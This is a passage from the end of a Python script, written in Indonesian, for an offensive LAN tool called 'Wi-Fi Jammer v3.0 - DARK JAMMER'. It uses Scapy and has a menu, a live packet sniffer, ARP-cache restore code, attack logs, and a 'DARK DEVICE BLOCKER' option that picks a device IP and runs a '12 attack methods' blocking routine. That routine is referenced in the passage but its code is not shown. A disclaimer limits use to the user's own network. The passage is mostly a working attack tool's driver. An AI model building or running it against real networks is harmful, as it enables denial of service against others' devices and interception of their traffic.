{C['Y']}  ⏱️  Total Duration:     {duration} detik
{C['Y']}  📦 Total Packets:      {total_packets:,}
{C['Y']}  ⚔️  Attack Methods:     12 ACTIVE
{C['Y']}  🎯 Target:            {target_ip} ({vendor})
{C['Y']}  💀 Status:            NEUTRALIZED

{C['G']}  {EMO['shield']} Network restored! Target can now reconnect.{C['RESET']}
            """)
            
            print(f"\n{C['C']}{'─'*70}{C['RESET']}")
            print(f"{C['BOLD']}📊 ATTACK METHOD BREAKDOWN:{C['RESET']}")
            for method, count in sorted(self.packet_stats.items(), key=lambda x: x[1], reverse=True):
                if count > 0:
                    print(f"  {C['R']}{method}:{C['RESET']} {count:,} packets")
            print(f"{C['C']}{'─'*70}{C['RESET']}")
            
            del self.blocked_devices[target_ip]
            self.log_event('APOCALYPSE_UNBLOCK', target_ip, f'Blocking stopped after {duration}s', 'INFO')
            return True
        
        return True
    
    def restore_network(self):
        """Restore network ke normal"""
        print(f"\n{C['C']}{EMO['protect']} Restoring network...{C['RESET']}")
        try:
            gateway_ip, gateway_mac = self.get_gateway()
            if gateway_ip and gateway_mac:
                for ip, mac in self.arp_table.items():
                    packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=gateway_ip, hwsrc=gateway_mac)
                    send(packet, count=3, verbose=False, iface=self.interface)
            
            if os.name != 'nt':
                subprocess.run(['sudo', 'ip', 'neigh', 'flush', 'all'], capture_output=True)
            
            self.blocked_devices.clear()
            self.packet_stats.clear()
            self.stop_event.set()
            self.running = False
            
            print(f"{C['G']}{EMO['check']} Network restored successfully!{C['RESET']}")
            self.log_event('RESTORE', 'NETWORK', 'Network restored', 'INFO')
        except Exception as e:
            print(f"{C['R']}Restore error: {e}{C['RESET']}")
    
    def packet_sniffer_live(self, count=200):
        """LIVE PACKET SNIFFER"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['packet']} LIVE PACKET SNIFFER PRO {EMO['packet']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        print(f"\n{C['C']}Target: {count} packets{C['RESET']}")
        print(f"{C['Y']}Tekan Ctrl+C untuk menghentikan{C['RESET']}\n")
        
        packets = []
        protocol_stats = defaultdict(int)
        ip_stats = defaultdict(int)
        
        def packet_callback(pkt):
            if len(packets) < count:
                packets.append(pkt)
                
                if pkt.haslayer(IP):
                    proto = pkt[IP].proto
                    proto_name = {6:'TCP', 17:'UDP', 1:'ICMP'}.get(proto, f'P-{proto}')
                    protocol_stats[proto_name] += 1
                    ip_stats[pkt[IP].src] += 1
                    
                    sys.stdout.write(f"\r{C['G']}Captured:{C['RESET']} {len(packets)}/{count} | "
                                   f"{C['C']}TCP:{C['RESET']}{protocol_stats['TCP']} "
                                   f"{C['B']}UDP:{C['RESET']}{protocol_stats['UDP']} "
                                   f"{C['Y']}ICMP:{C['RESET']}{protocol_stats['ICMP']} | "
                                   f"{C['M']}Unique IPs:{C['RESET']}{len(ip_stats)}")
                    sys.stdout.flush()
        
        try:
            sniff(prn=packet_callback, count=count, iface=self.interface, timeout=60, store=0)
            
            print(f"\n\n{C['G']}{EMO['check']} Capture complete! {len(packets)} packets{C['RESET']}")
            
            print(f"\n{C['BOLD']}{C['C']}{'='*50}{C['RESET']}")
            print(f"{C['BOLD']}PACKET ANALYSIS:{C['RESET']}")
            print(f"  {C['Y']}Total Packets:{C['RESET']} {len(packets)}")
            for proto, count in protocol_stats.items():
                percentage = (count / len(packets)) * 100 if packets else 0
                print(f"  {C['C']}{proto}:{C['RESET']} {count} packets ({percentage:.1f}%)")
            
            print(f"\n{C['BOLD']}TOP TALKERS:{C['RESET']}")
            top_ips = sorted(ip_stats.items(), key=lambda x: x[1], reverse=True)[:5]
            for ip, count in top_ips:
                print(f"  {C['Y']}{ip}:{C['RESET']} {count} packets")
            
            self.log_event('SNIFF', 'All traffic', f'Captured {len(packets)} packets', 'INFO')
            return packets
            
        except KeyboardInterrupt:
            print(f"\n{C['Y']}{EMO['alert']} Sniffer stopped by user{C['RESET']}")
            return packets
        except Exception as e:
            print(f"\n{C['R']}Error: {e}{C['RESET']}")
            return []
    
    def show_detailed_system_info(self):
        """Tampilkan info sistem detail"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['info']} SYSTEM INFORMATION {EMO['info']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        print(f"\n{C['BOLD']}{C['G']}{EMO['net']} NETWORK INFORMATION:{C['RESET']}")
        print(f"  {C['Y']}Interface:{C['RESET']} {self.interface}")
        print(f"  {C['Y']}Your IP:{C['RESET']} {self.my_ip}")
        print(f"  {C['Y']}Your MAC:{C['RESET']} {self.my_mac}")
        print(f"  {C['Y']}Gateway IP:{C['RESET']} {self.gateway_ip}")
        print(f"  {C['Y']}Gateway MAC:{C['RESET']} {self.gateway_mac}")
        
        print(f"\n{C['BOLD']}{C['B']}{EMO['tool']} SYSTEM INFORMATION:{C['RESET']}")
        print(f"  {C['Y']}Operating System:{C['RESET']} {platform.system()} {platform.release()}")
        print(f"  {C['Y']}Python Version:{C['RESET']} {sys.version.split()[0]}")
        print(f"  {C['Y']}Hostname:{C['RESET']} {socket.gethostname()}")
        print(f"  {C['Y']}Admin/Root:{C['RESET']} Yes")
        
        print(f"\n{C['BOLD']}{C['M']}{EMO['database']} STATISTICS:{C['RESET']}")
        print(f"  {C['Y']}Devices in ARP Cache:{C['RESET']} {len(self.arp_table)}")
        print(f"  {C['Y']}Total Events Logged:{C['RESET']} {len(self.attack_log)}")
        print(f"  {C['Y']}Log File:{C['RESET']} {self.log_file}")
        print(f"  {C['Y']}Version:{C['RESET']} v3.0 DARK JAMMER")
        
        if self.attack_log:
            print(f"\n{C['BOLD']}{C['C']}{EMO['time']} RECENT ACTIVITIES (last 10):{C['RESET']}")
            for log in self.attack_log[-10:]:
                severity_color = C['R'] if log['severity'] == 'CRITICAL' else C['Y'] if log['severity'] == 'HIGH' else C['G']
                print(f"  {severity_color}[{log['timestamp'][11:19]}]{C['RESET']} {log['event_type']} → {log['target']}")
    
    def show_attack_logs(self):
        """Tampilkan semua log serangan"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['database']} ATTACK LOG HISTORY {EMO['database']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        if not self.attack_log:
            print(f"\n{C['Y']}No logs available{C['RESET']}")
            return
        
        print(f"\n{C['BOLD']}{'No.':<5} {'Time':<12} {'Event Type':<20} {'Target':<20} {'Severity':<10}{C['RESET']}")
        print(f"{C['C']}{'-'*70}{C['RESET']}")
        
        for i, log in enumerate(self.attack_log[-30:], 1):
            severity_color = C['R'] if log['severity'] == 'CRITICAL' else C['Y'] if log['severity'] == 'HIGH' else C['G']
            print(f"{i:<5} {log['timestamp'][11:19]:<12} {log['event_type']:<20} {log['target'][:20]:<20} {severity_color}{log['severity']:<10}{C['RESET']}")
        
        print(f"{C['C']}{'='*70}{C['RESET']}")
        print(f"\n{C['Y']}Total logs: {len(self.attack_log)}{C['RESET']}")
        print(f"{C['Y']}Log file: {self.log_file}{C['RESET']}")
    
    def network_backup(self):
        """Backup network settings"""
        print(f"\n{C['C']}{EMO['back']} Creating network backup...{C['RESET']}")
        try:
            with open(self.backup_file, 'w') as f:
                f.write(f"Backup created: {datetime.now()}\n")
                f.write(f"Interface: {self.interface}\n")
                f.write(f"IP: {self.my_ip}\n")
                f.write(f"MAC: {self.my_mac}\n")
                f.write(f"Gateway: {self.gateway_ip}\n")
                f.write(f"Gateway MAC: {self.gateway_mac}\n")
                f.write(f"ARP Table: {json.dumps(self.arp_table, indent=2)}\n")
            
            print(f"{C['G']}{EMO['check']} Backup saved to: {self.backup_file}{C['RESET']}")
            self.log_event('BACKUP', 'NETWORK', 'Backup created', 'INFO')
        except Exception as e:
            print(f"{C['R']}Backup failed: {e}{C['RESET']}")
    
    def show_attack_stats(self):
        """Tampilkan statistik serangan"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['database']} ATTACK STATISTICS {EMO['stats']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        total_packets = sum(self.packet_stats.values())
        
        print(f"""
{C['BOLD']}📊 OVERALL STATISTICS:{C['RESET']}
  {C['Y']}Total Packets Sent:     {C['R']}{total_packets:,}
  {C['Y']}Blocked Devices:        {C['R']}{len(self.blocked_devices)}
  {C['Y']}Total Events Logged:    {C['R']}{len(self.attack_log)}
  {C['Y']}Active Threads:         {C['R']}{threading.active_count()}
  {C['Y']}Version:                {C['R']}v3.0 DARK JAMMER

{C['BOLD']}⚔️  PACKET BREAKDOWN PER METHOD:{C['RESET']}""")
        
        if self.packet_stats:
            for method, count in sorted(self.packet_stats.items(), key=lambda x: x[1], reverse=True):
                bar_len = min(50, int(count / max(1, total_packets) * 50))
                bar = "█" * bar_len + "░" * (50 - bar_len)
                print(f"  {C['R']}{method:20}{C['RESET']} {bar} {count:,}")
        else:
            print(f"  {C['Y']}No attack data yet{C['RESET']}")
        
        if self.blocked_devices:
            print(f"\n{C['BOLD']}💀 CURRENTLY BLOCKED DEVICES:{C['RESET']}")
            for ip, info in self.blocked_devices.items():
                duration = (datetime.now() - info['start_time']).seconds
                print(f"  {C['R']}🔴 {ip} - {info['vendor']} ({duration}s) - {info['methods']} methods{C['RESET']}")
        
        print(f"\n{C['C']}{'='*70}{C['RESET']}")
    
    def menu_ultimate(self):
        """Menu utama ultimate edition"""
        self.my_ip = self.get_my_ip()
        self.my_mac = self.get_my_mac()
        self.gateway_ip, self.gateway_mac = self.get_gateway()
        
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(f"""
{C['BOLD']}{C['R']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['R']}║{C['RESET']}                                                       {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['Y']}{EMO['crown']} Wi-Fi Jammer v3.0 - DARK JAMMER {EMO['apocalypse']}{C['RESET']}                         {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['R']}{EMO['death']} 12 ATTACK METHODS - TOTAL ANNIHILATION! {EMO['skull']}{C['RESET']}                               {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['C']}{EMO['secure']} 🔒 HANYA UNTUK UJI KEAMANAN JARINGAN SENDIRI! 🔒 {EMO['secure']}{C['RESET']}                         {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                                                                                          {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['C']}{EMO['net']} INTERFACE: {self.interface:<30} {EMO['device']} YOUR IP: {self.my_ip:<20}
{C['Y']}{EMO['router']} GATEWAY: {str(self.gateway_ip):<30} {EMO['shield']} STATUS: {'🔴 ACTIVE' if self.running else '🟢 IDLE'}

{C['BOLD']}{C['R']}{'═'*70}{C['RESET']}
{C['BOLD']}{C['G']}                                    MAIN MENU{C['RESET']}
{C['BOLD']}{C['R']}{'═'*70}{C['RESET']}

{C['BOLD']}{C['Y']}┌────────────────────────────────────────────────────────────────────┐{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}1.{C['RESET']} {EMO['scan']} ADVANCED NETWORK SCANNER      {C['G']}6.{C['RESET']} {EMO['packet']} LIVE PACKET SNIFFER        {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}2.{C['RESET']} {EMO['protect']} PRO ARP SPOOFING DETECTOR   {C['G']}7.{C['RESET']} {EMO['database']} VIEW ATTACK LOGS         {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['R']}3.{C['RESET']} {EMO['apocalypse']} DARK DEVICE BLOCKER  {C['G']}8.{C['RESET']} {EMO['info']} SYSTEM INFORMATION       {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}4.{C['RESET']} {EMO['alert']} DEAUTH ATTACK DETECTOR       {C['G']}9.{C['RESET']} {EMO['back']} NETWORK BACKUP           {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}5.{C['RESET']} {EMO['wifi']} WIFI NETWORK SCANNER         {C['G']}10.{C['RESET']}{EMO['stats']} ATTACK STATISTICS      {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['R']}0.{C['RESET']} {EMO['exit']} EXIT                                                          {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}└────────────────────────────────────────────────────────────────────┘{C['RESET']}

{C['Y']}{EMO['warning']} Developer: HamzzXPP | Version: v3.0 DARK JAMMER
{C['R']}{EMO['death']} ⚠️  12 ATTACK METHODS SIMULTANEOUS - TOTAL POWER! ⚠️
{C['C']}{EMO['info']} 📋 Semua aktivitas dicatat di: {self.log_file}

{C['BOLD']}{C['R']}{'═'*70}{C['RESET']}
""")
            
            choice = input(f"{C['BOLD']}PILIH MENU (0-10): {C['RESET']}")
            
            if choice == '1':
                self.scan_network_advanced()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '2':
                self.arp_spoofing_detection_pro(60)
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '3':
                devices = self.scan_network_advanced()
                if devices:
                    print(f"\n{C['B']}Daftar device:{C['RESET']}")
                    for i, d in enumerate(devices, 1):
                        print(f"  {i}. {d['ip']} - {d['vendor']}")
                    target = input(f"\n{C['R']}IP target untuk DARK JAMMER: {C['RESET']}")
                    self.block_device_apocalypse(target)
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '4':
                print(f"\n{C['Y']}{EMO['info']} Deauth Detection: Butuh monitor mode (Linux){C['RESET']}")
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '5':
                print(f"\n{C['Y']}{EMO['info']} WiFi Scanner: Butuh monitor mode (Linux){C['RESET']}")
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '6':
                count = input(f"{C['B']}Jumlah packets (default 200): {C['RESET']}")
                count = int(count) if count else 200
                self.packet_sniffer_live(count)
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '7':
                self.show_attack_logs()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '8':
                self.show_detailed_system_info()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '9':
                self.network_backup()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '10':
                self.show_attack_stats()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '0':
                print(f"\n{C['G']}{EMO['check']} Restoring network and saving logs...{C['RESET']}")
                self.restore_network()
                print(f"{C['G']}{EMO['database']} Log saved: {self.log_file}{C['RESET']}")
                print(f"{C['G']}{EMO['check']} Terima kasih telah menggunakan Wi-Fi Jammer v3.0 APOCALYPSE BLOCKER!{C['RESET']}\n")
                sys.exit(0)
            
            else:
                print(f"{C['R']}Pilihan tidak valid!{C['RESET']}")
                time.sleep(1)

# ========== MAIN PROGRAM ==========
def main():
    print(f"\n{C['G']}{EMO['apocalypse']} Wi-Fi Jammer v3.0 - DARK BLOCKER {EMO['death']}{C['RESET']}")
    print(f"{C['Y']}Initializing security modules...{C['RESET']}\n")
    time.sleep(1)
    
    login = LoginSystem()
    if not login.login():
        print(f"{C['R']}Login failed! Exiting...{C['RESET']}")
        sys.exit(1)
    
    if not SCAPY_OK:
        print(f"{C['R']}Scapy not installed! Run: pip install scapy{C['RESET']}")
        sys.exit(1)
    
    tester = UltimateNetworkTester()
    
    print(f"{C['R']}{'='*70}{C['RESET']}")
    print(f"{C['R']}{EMO['death']} DISCLAIMER ULTRA PENTING! {EMO['death']}{C['RESET']}")
    print(f"{C['R']}{'='*70}{C['RESET']}")
    print(f"{C['Y']}1. Tools ini hanya untuk UJI KEAMANAN jaringan SENDIRI{C['RESET']}")
    print(f"{C['Y']}2. Menggunakan di jaringan orang lain = MELANGGAR HUKUM{C['RESET']}")
    print(f"{C['Y']}3. 12 METODE ATTACK SIMULTAN - SANGAT BERBAHAYA!{C['RESET']}")
    print(f"{C['Y']}4. Penyalahgunaan dapat dikenakan UU ITE Pasal 30-36{C['RESET']}")
    print(f"{C['Y']}5. Ancaman: PENJARA 8 TAHUN + DENDA Rp 10 MILIAR{C['RESET']}")
    print(f"{C['R']}{'='*70}{C['RESET']}")
    
    agree = input(f"\n{C['BOLD']}Apakah Anda memahami dan akan mematuhi? (yes/no): {C['RESET']}")
    if agree.lower() != 'yes':
        print(f"\n{C['R']}Program keluar. Gunakan secara bertanggung jawab!{C['RESET']}")
        sys.exit(0)
    
    try:
        tester.menu_ultimate()
    except KeyboardInterrupt:
        tester.restore_network()
        print(f"\n{C['Y']}{EMO['alert']} Program dihentikan oleh user{C['RESET']}")
        sys.exit(0)
    except Exception as e:
        print(f"{C['R']}Error: {e}{C['RESET']}")
        sys.exit(1)

if __name__ == "__main__":
    main()